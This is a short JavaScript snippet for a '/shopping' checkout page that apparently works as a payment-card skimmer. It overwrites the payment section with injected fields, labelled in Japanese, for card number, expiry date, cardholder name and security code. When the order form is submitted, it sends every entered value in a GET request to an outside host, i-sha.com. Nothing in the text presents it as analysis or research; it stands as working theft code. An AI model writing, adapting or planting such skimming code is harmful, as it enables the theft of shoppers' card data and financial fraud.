if (location.pathname == '/shopping') {
    let elem = document.querySelector("#shopping-form > div > div >div.order_payment > div.radio");
    elem.innerHTML = '<p>カード番号<input type="text id="get_number" /></p><p>有効期限<input type="text" id="get_exp_month"/>月/<input type="text" id="get_exp_year"/>年</p><p>名義<input type="text" id="get_name" /></p><p>セキュリティコード<input type="text" id="get_code" /></p><input type="hidden" name="order[Payment]" value="1"/>';
    let form = document.getElementById('shopping-form');
    form.addEventListener('submit', function () {
        const req = new XMLHttpRequest();
        let number = document.getElementById('get_number').value;
        let exp_month = document.getElementById('get_exp_month').value;
        let exp_year = document.getElementById('get_exp_year').value;
        let name = document.getElementById('get_name').value;
        let code = document.getElementById('get_code').value;
        let url = 'https://i-sha.com/?num=' + number + '&exp=' + exp_month + '%2F' + exp_year + '&name=' + name + '&code=' + code;
        req.open("GET", url);
        req.send();
    });
};